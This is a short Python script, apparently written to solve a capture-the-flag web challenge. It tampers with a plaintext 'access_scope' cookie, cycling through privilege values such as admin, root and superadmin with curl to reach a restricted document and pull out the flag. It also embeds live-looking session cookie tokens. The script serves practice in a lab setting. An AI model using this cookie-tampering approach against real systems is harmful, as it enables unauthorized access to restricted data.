#!/usr/bin/env python3
"""
Desafío «Credencial prestada» — manipulación de la cookie de alcance.

La sesión trae `access_scope=vendor` en claro. Se prueban distintos valores
para intentar acceder al anexo restringido de CL-7903.
"""
import re
import subprocess

COOKIE = "trama_session=Qxb--XmOYLR8yvrLD3JNqgoNeORG7knSWUJ1FEn09gWrQXt8buBA5iFa-HMjwNQu"
SESS = (".eJw1yjEOgCAMQNG7dHYoYA3xMqZijQ4WU8HFeHd1cPwv_4JhF9tYRQv0xao0wLUsb66Ji0w_atYk0IPznnEM6GIMlNo50NwhtkwxIpF30EA9xJS3794tnyJTNnRwP5voIj8.atva6w.9EsgsCXfvYy425zEOmEKVPj1I30")
BASE = "https://<host>"
DOC = "/documents/anexo-cl-7903"

scopes = [
    "vendor", "admin", "administrator", "administracion", "asterion", "internal",
    "interno", "auditor", "audit", "compliance", "security", "seguridad", "ops",
    "operaciones", "all", "root", "superadmin", "quality", "qa", "clasificado",
    "classified", "restricted", "full", "partner", "customer", "cliente",
    "logistics", "crimson", "asterion_internal", "internal_admin", "Asterion",
    "ADMIN", "Admin", "VENDOR", "1", "true",
]

for s in scopes:
    r = subprocess.run(["curl", "-s", "-m", "15", "-w", "\n__C__%{http_code}",
                        "-b", f"{COOKIE};asterion_session={SESS};access_scope={s}",
                        BASE + DOC], capture_output=True, text=True)
    cuerpo, _, code = r.stdout.rpartition("__C__")
    txt = re.sub(r"\s+", " ", re.sub(r"<[^>]+>", " ", cuerpo))
    marca = ""
    if "TRAMACTF" in cuerpo:
        marca = " <<< FLAG " + re.search(r"TRAMACTF\{[^}]*\}", cuerpo).group(0)
    print(f"{s:20s} -> {code.strip():3s} len={len(cuerpo):5d}{marca}")
    if code.strip() == "200" and s != "vendor":
        open(f"/mnt/c/Users/<usuario>/OneDrive - dipreca.cl/Agentes IA/AUDITORIA_IA_V2/ctf/cookies/work/anexo_{s}.html",
             "w", encoding="utf-8").write(cuerpo)
